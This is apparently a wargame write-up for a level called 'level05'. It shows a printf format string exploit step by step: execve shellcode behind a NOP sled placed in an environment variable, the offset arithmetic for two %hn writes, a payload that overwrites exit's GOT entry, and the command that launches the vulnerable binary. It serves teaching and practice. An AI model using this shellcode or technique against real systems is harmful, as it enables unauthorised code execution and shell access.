Here it's a simple printf format string exploit.

I create my payload that I will store in an environment variable.

```bash
perl -e 'print "\x90"x1000 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' > /tmp/payload
```

Here is one of the addresses of the NOP sled:

```
0xffffdd33
```

I can't write the full address in one go because it's too big, so I split it into two 2 bytes sections:

```
dd33 = 56627 - 8 = 56619

ffff = 65535 - 56627 = 8908
```

I then create my format string payload to overwrite the address of the `exit` function in the GOT with the address of my NOP sled:

```bash
perl -e 'print "\xe0\x97\x04\x08" . "\xe2\x97\x04\x08" . "%56619d%10\$hn%8908d%11\$hn"' > /tmp/exploit
```

Finally, I set the environment variable and run the vulnerable program:

```bash
cat /tmp/exploit - | env -i payload=$(cat /tmp/payload) ./level05
```
